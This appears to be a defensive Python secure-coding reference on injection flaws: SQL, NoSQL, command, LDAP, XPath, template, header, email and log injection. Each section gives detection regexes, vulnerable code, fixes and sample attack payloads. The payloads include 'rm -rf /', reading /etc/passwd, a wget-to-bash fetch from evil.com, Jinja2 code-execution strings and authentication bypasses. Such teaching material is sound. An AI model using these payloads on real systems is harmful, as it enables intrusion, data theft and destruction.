# Injection Vulnerability Patterns for Python

## SQL Injection

### Detection Patterns

**String Concatenation in Queries:**
```regex
\.execute\s*\(\s*["'].*["']\s*\+
\.execute\s*\(\s*["'].*["']\s*%
\.execute\s*\(\s*f["']
\.execute\s*\(\s*["'].*\.format\(
```

**Vulnerable Code Examples:**
```python
# String concatenation
cursor.execute("SELECT * FROM users WHERE id = " + user_id)
cursor.execute("SELECT * FROM users WHERE name = '" + name + "'")

# String formatting (%)
cursor.execute("SELECT * FROM users WHERE id = %s" % user_id)
cursor.execute("SELECT * FROM users WHERE name = '%s'" % name)

# f-strings
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")

# .format()
cursor.execute("SELECT * FROM users WHERE id = {}".format(user_id))

# ORM raw queries
User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")
db.session.execute(f"SELECT * FROM users WHERE id = {id}")
engine.execute(text(f"SELECT * FROM users WHERE id = {id}"))
```

### Safe Alternatives

```python
# Parameterized queries (positional)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Parameterized queries (named)
cursor.execute("SELECT * FROM users WHERE id = :id", {"id": user_id})

# SQLAlchemy with text()
from sqlalchemy import text
db.session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})

# Django ORM
User.objects.filter(id=user_id)
User.objects.filter(name=name)

# SQLAlchemy ORM
session.query(User).filter(User.id == user_id).first()
```

---

## NoSQL Injection

### MongoDB

**Detection Patterns:**
```regex
\.find\s*\(\s*\{[^}]*:\s*[^}]*\}
\.find_one\s*\(\s*\{[^}]*:\s*[^}]*\}
\$where
\$regex
```

**Vulnerable Code:**
```python
# Direct user input in query
db.users.find({"username": username, "password": password})

# JSON parsing without validation
query = json.loads(request.data)
db.users.find(query)  # Attacker sends {"$gt": ""}

# $where injection
db.users.find({"$where": f"this.username == '{username}'"})
```

**Attack Payloads:**
```python
# Bypass authentication
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$regex": ".*"}}

# Extract data
{"username": {"$regex": "^a"}}  # Enumerate usernames starting with 'a'
```

**Safe Alternatives:**
```python
# Validate input types
if not isinstance(username, str) or not isinstance(password, str):
    raise ValueError("Invalid input type")

# Use explicit field matching
db.users.find_one({
    "username": str(username),
    "password_hash": hash_password(password)
})

# Sanitize operators
def sanitize_query(query):
    if isinstance(query, dict):
        return {
            k: sanitize_query(v)
            for k, v in query.items()
            if not k.startswith('$')
        }
    return query
```

---

## Command Injection

### Detection Patterns

**os module:**
```regex
os\.system\s*\(
os\.popen\s*\(
os\.spawn[lv]?[pe]?\s*\(
```

**subprocess module:**
```regex
subprocess\.(call|run|Popen|check_output|check_call)\s*\([^)]*shell\s*=\s*True
subprocess\.(call|run|Popen|check_output|check_call)\s*\(\s*f["']
subprocess\.(call|run|Popen|check_output|check_call)\s*\(\s*["'].*["']\s*%
```

**Vulnerable Code:**
```python
import os
import subprocess

# os.system
os.system(f"ping {host}")
os.system("ls " + directory)

# os.popen
os.popen(f"cat {filename}")

# subprocess with shell=True
subprocess.call(f"ping {host}", shell=True)
subprocess.run(f"grep {pattern} {file}", shell=True)
subprocess.Popen(f"ls {dir}", shell=True, stdout=subprocess.PIPE)

# subprocess with string command
subprocess.call(f"ping {host}")  # Still vulnerable if shell=True is default
```

**Attack Payloads:**
```bash
# Command chaining
; rm -rf /
&& cat /etc/passwd
|| wget http://evil.com/shell.sh | bash

# Subshell execution
$(cat /etc/passwd)
`cat /etc/passwd`

# Input redirection
< /etc/passwd
> /tmp/pwned
```

**Safe Alternatives:**
```python
import subprocess
import shlex

# Use list arguments (no shell)
subprocess.run(['ping', '-c', '1', host])
subprocess.run(['grep', pattern, filename])

# If shell is required, use shlex.quote
subprocess.run(f"ping -c 1 {shlex.quote(host)}", shell=True)

# Validate against allowlist
import re
HOSTNAME_REGEX = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9.-]*$')
if not HOSTNAME_REGEX.match(host):
    raise ValueError("Invalid hostname")
subprocess.run(['ping', '-c', '1', host])
```

---

## LDAP Injection

### Detection Patterns

```regex
ldap.*search\s*\(\s*f["']
ldap.*search\s*\(\s*["'].*["']\s*%
ldap.*search\s*\(\s*["'].*["']\s*\+
\(uid=.*\)
\(cn=.*\)
\(mail=.*\)
```

**Vulnerable Code:**
```python
import ldap

# Direct string interpolation
conn.search(f"(uid={username})")
conn.search("(uid=%s)" % username)
conn.search("(uid=" + username + ")")

# Multiple fields
conn.search(f"(&(uid={username})(password={password}))")
```

**Attack Payloads:**
```
# Bypass authentication
*)(uid=*))(|(uid=*
admin)(|(password=*
*))%00

# Information disclosure
*)(objectClass=*
```

**Safe Alternatives:**
```python
from ldap3.utils.conv import escape_filter_chars

# Escape special characters
safe_username = escape_filter_chars(username)
conn.search(f"(uid={safe_username})")

# Or manual escaping
def ldap_escape(s):
    escape_chars = ['\\', '*', '(', ')', '\x00']
    for char in escape_chars:
        s = s.replace(char, '\\' + hex(ord(char))[2:].zfill(2))
    return s
```

---

## XPath Injection

### Detection Patterns

```regex
xpath\s*\(\s*f["']
\.xpath\s*\(\s*["'].*["']\s*%
\.xpath\s*\(\s*["'].*["']\s*\+
```

**Vulnerable Code:**
```python
from lxml import etree

# Direct string interpolation
tree.xpath(f"//users/user[@name='{username}']")
tree.xpath("//users/user[@name='%s']" % username)
```

**Attack Payloads:**
```
' or '1'='1
' or ''='
'] | //user | //user[@name='
```

**Safe Alternatives:**
```python
from lxml import etree

# Use XPath variables
tree.xpath("//users/user[@name=$name]", name=username)

# Or parameterized queries
tree.xpath("//users/user[@name=$name]", namespaces=None, name=username)
```

---

## Template Injection (SSTI)

### Detection Patterns

```regex
render_template_string\s*\(
Template\s*\([^)]*\)\.render
jinja2\.Template\s*\(
Environment\s*\(\s*\)\.from_string
```

**Vulnerable Code:**
```python
from flask import render_template_string
from jinja2 import Template

# Direct user input in template
render_template_string(user_input)
render_template_string(f"Hello {user_name}")  # If user_name contains {{ }}

# Jinja2 Template
template = Template(user_input)
template.render()
```

**Attack Payloads:**
```python
# Read config
{{ config }}
{{ config.items() }}

# RCE via Jinja2
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ ''.__class__.__base__.__subclasses__()[X].__init__.__globals__['os'].popen('id').read() }}

# Flask specific
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Safe Alternatives:**
```python
from flask import render_template
from markupsafe import escape

# Use render_template with file-based templates
render_template('hello.html', name=user_name)

# If dynamic templates needed, escape user input
render_template_string("Hello {{ name }}", name=escape(user_name))

# Use sandboxed environment
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string(user_template)
```

---

## Header Injection

### Detection Patterns

```regex
response\.headers\[['"'][^'"']+['"']\]\s*=\s*[^;]+\+
\.add_header\s*\([^)]*\+
\.set_header\s*\([^)]*\+
```

**Vulnerable Code:**
```python
# Flask
response.headers['X-Custom'] = user_input
response.headers['Location'] = redirect_url  # CRLF injection

# Direct header setting
@app.after_request
def add_header(response):
    response.headers['X-User'] = request.args.get('user')
    return response
```

**Attack Payloads:**
```
# CRLF injection
value\r\nX-Injected: malicious
value\r\n\r\n<script>alert(1)</script>
```

**Safe Alternatives:**
```python
import re

def sanitize_header(value):
    # Remove CR and LF characters
    return re.sub(r'[\r\n]', '', str(value))

response.headers['X-Custom'] = sanitize_header(user_input)

# Or use framework-provided sanitization
from werkzeug.utils import escape
```

---

## Email Header Injection

### Detection Patterns

```regex
(To|From|Cc|Bcc|Subject)\s*[:=]\s*.*\+
send_mail\s*\([^)]*\+
EmailMessage\s*\([^)]*user
```

**Vulnerable Code:**
```python
from email.message import EmailMessage
import smtplib

# Direct user input in headers
msg = EmailMessage()
msg['To'] = user_email
msg['Subject'] = user_subject  # Can inject headers

# String concatenation
headers = f"To: {user_email}\r\nSubject: {subject}"
```

**Attack Payloads:**
```
# Add BCC recipients
victim@example.com\r\nBcc: attacker@evil.com

# Inject content
Test\r\n\r\nMalicious body content
```

**Safe Alternatives:**
```python
import re

def sanitize_email_header(value):
    # Remove newlines
    return re.sub(r'[\r\n]', '', str(value))

# Validate email format
import email_validator
email_validator.validate_email(user_email)

# Use framework email functions that handle sanitization
from django.core.mail import send_mail
send_mail(subject, message, from_email, [sanitize_email_header(user_email)])
```

---

## Log Injection

### Detection Patterns

```regex
logger?\.(info|debug|warning|error|critical)\s*\([^)]*\+
logger?\.(info|debug|warning|error|critical)\s*\(f["']
logging\.(info|debug|warning|error|critical)\s*\([^)]*\+
```

**Vulnerable Code:**
```python
import logging

# Direct user input in logs
logging.info(f"User {username} logged in")
logging.info("Search query: " + user_query)
```

**Attack Payloads:**
```
# Inject fake log entries
admin\n[INFO] User admin logged in from 127.0.0.1

# Log forging for SIEM bypass
user123\n[INFO] Security scan: No vulnerabilities found
```

**Safe Alternatives:**
```python
import logging
import re

def sanitize_log(value):
    # Remove newlines and control characters
    return re.sub(r'[\r\n\x00-\x1f]', '', str(value))

logging.info("User %s logged in", sanitize_log(username))

# Or use structured logging
import structlog
logger = structlog.get_logger()
logger.info("user_logged_in", username=username)  # Automatically escaped
```
